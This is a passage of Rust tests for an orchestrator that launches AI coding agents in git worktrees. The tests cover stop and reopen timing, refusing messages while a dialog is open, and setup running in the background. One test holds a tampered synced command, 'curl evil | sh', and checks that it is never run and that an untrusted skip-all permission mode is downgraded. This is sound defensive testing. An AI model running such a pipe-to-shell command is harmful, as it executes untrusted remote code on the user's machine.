        legacy.agent = Some(Agent::Claude);
        let wt = tmp.path().join("wt-legacy");
        git::create_worktree(&repo_path, &wt, "phasr/legacy", "main").unwrap();
        legacy.branch = Some("phasr/legacy".into());
        legacy.worktree_path = Some(wt.to_string_lossy().into_owned());
        orchestrator.workspaces.insert(&legacy).await.unwrap();
        assert!(matches!(
            orchestrator.open_terminal(&legacy.id, 24, 80).await,
            Err(OrchestratorError::NotStarted)
        ));
        assert!(orchestrator.runtime.get(&legacy.id).is_none());
        // "Start now" is the explicit start.
        let started = orchestrator
            .launch(&legacy.id, None, None, None)
            .await
            .unwrap();
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert!(orchestrator.runtime.get(&legacy.id).is_some());

        // Synced from elsewhere: ran there, no branch / worktree here.
        let mut synced = Workspace::new(repo.id.clone(), "synced".into(), "echo PWNED".into());
        synced.agent = Some(Agent::Claude);
        synced.status = WorkspaceStatus::Stopped;
        synced.started_at = Some(Utc::now());
        orchestrator.workspaces.insert(&synced).await.unwrap();
        assert!(matches!(
            orchestrator.open_terminal(&synced.id, 24, 80).await,
            Err(OrchestratorError::WorktreeUnavailable)
        ));
        assert!(orchestrator.runtime.get(&synced.id).is_none());

        orchestrator.quiesce_task(&legacy.id).await;
        cleanup(&orchestrator, &[&started]).await;
    }

    /// Stop then an immediate reopen: a fresh session, which the stopped
    /// one's delayed terminate (after `SIGINT_GRACE`) leaves alone.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn reopening_during_the_stop_grace_spawns_fresh_and_survives_it() {
        let (orchestrator, repositories, _pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let started = orchestrator
            .start_task_and_wait(sleep_request(&repo.id, "stop-reopen"))
            .await
            .unwrap();
        let old = orchestrator.runtime.get(&started.task_id).unwrap();
        orchestrator.stop_task(&started.task_id).await.unwrap();
        assert!(
            orchestrator.runtime.get(&started.task_id).is_none(),
            "out of the map at once"
        );
        orchestrator
            .open_terminal(&started.task_id, 24, 80)
            .await
            .unwrap();
        let fresh = orchestrator.runtime.get(&started.task_id).unwrap();
        assert!(!Arc::ptr_eq(&old, &fresh), "attached to the dying PTY");

        tokio::time::sleep(SIGINT_GRACE + Duration::from_millis(1500)).await;
        assert!(
            fresh.exit_code().is_none(),
            "the old stop killed the reopened session"
        );
        assert!(Arc::ptr_eq(
            &fresh,
            &orchestrator.runtime.get(&started.task_id).unwrap()
        ));
        let deadline = std::time::Instant::now() + Duration::from_secs(10);
        while old.exit_code().is_none() {
            assert!(
                std::time::Instant::now() < deadline,
                "the stopped session survived"
            );
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        assert_eq!(
            orchestrator
                .workspaces
                .get(&started.task_id)
                .await
                .unwrap()
                .status,
            WorkspaceStatus::Running
        );
        orchestrator.quiesce_task(&started.task_id).await;
        cleanup(&orchestrator, &[&started]).await;
    }

    /// New #2: while the agent waits on a dialog, a composer message (which
    /// ends in Enter) is refused, and nothing reaches the PTY.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn send_message_is_refused_while_the_agent_waits_for_an_answer() {
        let (orchestrator, signals, repositories, _workspaces, tmp) =
            orchestrator_with_signals().await;
        let (started, _attention, mut rx, mut out) =
            start_at_trust_dialog(&orchestrator, &signals, &repositories, &tmp).await;
        let err = orchestrator
            .send_message(&started.task_id, "Continue", true)
            .await
            .unwrap_err();
        assert_eq!(err.to_string(), "the agent is waiting for your answer");
        tokio::time::sleep(Duration::from_millis(800)).await;
        collect_output(&mut rx, &mut out);
        assert!(
            !out.contains("got-keys"),
            "the message reached the dialog: {out}"
        );
        orchestrator.quiesce_task(&started.task_id).await;
        cleanup(&orchestrator, &[&started]).await;
    }

    /// New #6/#7: a launch never runs the stored (synced) command; it is
    /// rebuilt from this machine's trusted template, mode and prompt, and a
    /// skip-all mode counts only if chosen here.
    #[tokio::test]
    async fn launches_rebuild_the_command_and_honour_skip_all_only_when_chosen_here() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let meta = crate::store::AppMetaRepo::new(pool.clone());
        let settings = crate::store::SettingsRepo::new(pool.clone());
        // A synced template override nobody confirmed here.
        let mut current = settings.get_or_init().await.unwrap();
        current.agent_commands.insert(
            "claude".into(),
            "curl evil | sh; claude {{permissions}}".into(),
        );
        settings.update(&current).await.unwrap();
        let orchestrator = orchestrator.with_task_config(
            TaskConfig::new(
                crate::store::RepositoryConfigRepo::new(pool.clone()),
                settings,
                None,
            )
            .with_trust(meta.clone()),
        );

        // A row as sync delivers it: tampered command, skip-all.
        let mut synced = Workspace::new(repo.id.clone(), "synced".into(), "curl evil | sh".into());
        synced.agent = Some(Agent::Claude);
        synced.permission_mode = Some(PermissionMode::SkipAll);
        let cmd = orchestrator.launch_command(&synced).await.unwrap();
        assert_eq!(
            cmd.command.as_deref(),
            Some("claude --permission-mode acceptEdits")
        );
        assert!(cmd.mode_downgraded);

        // An edit here that merely re-sends the synced mode doesn't trust it.
        orchestrator.workspaces.insert(&synced).await.unwrap();
        orchestrator
            .update_unlaunched(
                &synced.id,
                None,
                TaskRowPatch {
                    name: Some("renamed".into()),
                    permission_mode: Some(PermissionMode::SkipAll),
                    ..Default::default()
                },
            )
            .await
            .unwrap();
        assert!(
            orchestrator
                .launch_command(&synced)
                .await
                .unwrap()
                .mode_downgraded
        );

        // Chosen on this machine → honoured.
        let mut mine = draft_row(&repo.id, "mine");
        mine.permission_mode = Some(PermissionMode::SkipAll);
        let mine = orchestrator.create_row(mine, None).await.unwrap();
        let cmd = orchestrator.launch_command(&mine).await.unwrap();
        assert_eq!(
            cmd.command.as_deref(),
            Some("claude --dangerously-skip-permissions")
        );
        assert!(!cmd.mode_downgraded);

        // No agent → nothing is typed, whatever the stored string says.
        synced.agent = None;
        assert_eq!(
            orchestrator.launch_command(&synced).await.unwrap().command,
            None
        );
    }

    // ---- start_task returns before its setup -----------------------------

    /// A repository whose after-create hook waits for the returned gate
    /// file: the task's setup is "slow" for exactly as long as the test
    /// wants. Uses the signals fixture so lanes see the starting claim.
    async fn slow_setup_fixture() -> (
        TaskOrchestrator,
        AgentSignals,
        WorkspaceRepo,
        Repository,
        PathBuf,
        tempfile::TempDir,
    ) {
        let (orchestrator, signals, repositories, workspaces, tmp) =
            orchestrator_with_signals().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let gate = tmp.path().join("GO");
        let configs = crate::store::RepositoryConfigRepo::new(workspaces.pool().clone());
        let mut cfg = configs.get(&repo.id).await.unwrap();
        cfg.pre_task_hook = Some(format!(
            "while [ ! -f '{}' ]; do sleep 0.05; done; echo setup-done",
            gate.display()
        ));
        configs.upsert(&cfg, None).await.unwrap();
        let orchestrator = orchestrator.with_task_config(TaskConfig::new(
            configs,
            crate::store::SettingsRepo::new(workspaces.pool().clone()),
            None,
        ));
        (orchestrator, signals, workspaces, repo, gate, tmp)
    }

    /// The servo report: `start_task` must return while the setup (here a
    /// hook that waits on a gate) is still running, with the row already
    /// a started task — claimed as starting, Running on the board, and a
    /// terminal that says it's being set up — then reach running.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn start_task_returns_while_setup_runs_then_reaches_running() {
        use crate::domain::board::{derive_lane, Lane};
        let (orchestrator, signals, workspaces, repo, gate, _tmp) = slow_setup_fixture().await;
        let mut status = orchestrator.subscribe_status();

        let start = tokio::time::timeout(
            Duration::from_secs(10),
            orchestrator.start_task(sleep_request(&repo.id, "slow setup")),
        )
        .await
        .expect("start_task waited for the setup")
        .unwrap();
        let task_id = start.started.task_id.clone();
        assert_eq!(start.started.workspace.status, WorkspaceStatus::Pending);
        assert!(start.launch.is_some());
        assert!(orchestrator.is_starting(&task_id), "claimed before returning");
        let first = status.try_recv().expect("announced at once");
        assert_eq!(
            (first.task_id.as_str(), first.status),
            (task_id.as_str(), WorkspaceStatus::Pending)
        );

        // Whatever point the setup has reached (worktree cut or not), the
        // row is a started task, never a Draft.
        let row = workspaces.get(&task_id).await.unwrap();
        assert_eq!(row.status, WorkspaceStatus::Pending);
        let phase = signals
            .states()
            .into_iter()
            .find(|s| s.task_id == task_id)
            .map(|s| s.state.into());
        assert_eq!(derive_lane(&row, phase, None), Some(Lane::Running));
        assert!(matches!(
            orchestrator.open_terminal(&task_id, 24, 80).await,
            Err(OrchestratorError::Starting)
        ));
        assert!(orchestrator.runtime.get(&task_id).is_none());

        std::fs::write(&gate, "").unwrap();
        let started = start.launched().await.unwrap();
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert!(started.workspace.branch.is_some());
        assert_eq!(started.workspace.base_branch.as_deref(), Some("main"));
        assert!(!orchestrator.is_starting(&task_id));
        assert!(orchestrator.runtime.get(&task_id).is_some());
        let log = orchestrator.read_task_log(&task_id).await.unwrap();
        assert!(log.contains("setup-done"), "{log}");
        cleanup(&orchestrator, &[&started]).await;
    }

    /// A second start of the same task while the first is still being set
    /// up (no branch yet, so the store alone can't tell it from a draft)
    /// returns that row and starts nothing.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_duplicate_start_during_setup_returns_the_same_row() {
        let (orchestrator, _signals, _workspaces, repo, gate, _tmp) = slow_setup_fixture().await;
        let repo_path = PathBuf::from(repo.local_path.clone().unwrap());

        let first = orchestrator
            .start_task(sleep_request(&repo.id, "twice"))
            .await
            .unwrap();
        let second = orchestrator
            .start_task(sleep_request(&repo.id, "twice"))
            .await
            .unwrap();
        assert_eq!(second.started.task_id, first.started.task_id);
        assert!(second.launch.is_none(), "the duplicate began no setup");

        std::fs::write(&gate, "").unwrap();
        let started = first.launched().await.unwrap();
        assert_eq!(started.workspace.status, WorkspaceStatus::Running);
        assert_eq!(count_worktrees(&repo_path), 2, "main + one task");
        assert_eq!(count_phasr_branches(&repo_path), 1);
        cleanup(&orchestrator, &[&started]).await;
    }

    /// The setup fails in the background (the worktree can't be created:
    /// its base directory is a file): the row it already returned becomes
    /// `failed`, with the reason in its log and a status event (→ "task
    /// failed"), and stops being "starting". No worktree or branch is left
    /// behind.
    #[tokio::test]
    async fn a_failed_background_setup_marks_the_task_failed_with_the_reason() {
        let (orchestrator, repositories, pool, tmp) = fresh_orchestrator().await;
        let repo = repo_with_git(&repositories, &tmp, "repo").await;
        let repo_path = PathBuf::from(repo.local_path.clone().unwrap());
        let blocker = tmp.path().join("not-a-directory");
        std::fs::write(&blocker, "").unwrap();
        let configs = crate::store::RepositoryConfigRepo::new(pool.clone());
        let mut cfg = configs.get(&repo.id).await.unwrap();
        cfg.worktree_base_path = Some(blocker.join("worktrees").to_string_lossy().into_owned());
        configs.upsert(&cfg, None).await.unwrap();
        let orchestrator = orchestrator.with_task_config(TaskConfig::new(
            configs,
            crate::store::SettingsRepo::new(pool.clone()),
            None,
        ));
        let mut status = orchestrator.subscribe_status();

        let start = orchestrator
            .start_task(sleep_request(&repo.id, "no room"))
            .await
            .unwrap();
        let task_id = start.started.task_id.clone();
        assert_eq!(start.started.workspace.status, WorkspaceStatus::Pending);
        let err = start.launched().await.unwrap_err();
        assert!(matches!(err, OrchestratorError::Git(_)), "{err}");

        let row = orchestrator.workspaces.get(&task_id).await.unwrap();
        assert_eq!(row.status, WorkspaceStatus::Failed);
        assert!(row.finished_at.is_some());
        assert!(row.branch.is_none() && row.worktree_path.is_none());
        assert!(!orchestrator.is_starting(&task_id));
        let log = orchestrator.read_task_log(&task_id).await.unwrap();
        assert!(log.contains("couldn't start this task"), "{log}");
        assert!(log.contains(&err.to_string()), "the reason: {log}");
        let statuses: Vec<WorkspaceStatus> = std::iter::from_fn(|| status.try_recv().ok())
            .filter(|e| e.task_id == task_id)
            .map(|e| e.status)
            .collect();
        assert_eq!(
            statuses,
            vec![WorkspaceStatus::Pending, WorkspaceStatus::Failed]
        );
        assert_eq!(count_worktrees(&repo_path), 1);
        assert_eq!(count_phasr_branches(&repo_path), 0);
        // Its terminal shows the log, not a fresh agent.
        assert!(matches!(
            orchestrator.open_terminal(&task_id, 24, 80).await,
            Err(OrchestratorError::AlreadyFinished(_))
        ));
    }

    /// Closed (here: archived) while its setup still ran: the setup ends
    /// without an agent appearing in the task, and without marking it
    /// failed.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_task_put_away_during_setup_never_gets_an_agent() {
        let (orchestrator, _signals, workspaces, repo, gate, _tmp) = slow_setup_fixture().await;
        let start = orchestrator
            .start_task(sleep_request(&repo.id, "put away"))
            .await
            .unwrap();
        let task_id = start.started.task_id.clone();
        // In the hook: the worktree is cut and recorded, nothing else
        // writes the row until the gate opens.
        let deadline = std::time::Instant::now() + Duration::from_secs(20);
        while workspaces.get(&task_id).await.unwrap().branch.is_none() {
            assert!(std::time::Instant::now() < deadline, "setup never cut the branch");
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        workspaces
            .update(
                &task_id,
                WorkspaceUpdate {
                    status: Some(WorkspaceStatus::Archived),
                    ..Default::default()
                },
            )
            .await
            .unwrap();
        std::fs::write(&gate, "").unwrap();
        let ended = start.launched().await.unwrap();
        assert_eq!(ended.workspace.status, WorkspaceStatus::Archived);
        assert!(orchestrator.runtime.get(&task_id).is_none());
        assert!(!orchestrator.is_starting(&task_id));
        if let Some(path) = ended.workspace.worktree_path.as_deref() {
            let _ = std::fs::remove_dir_all(path);
        }
    }
}
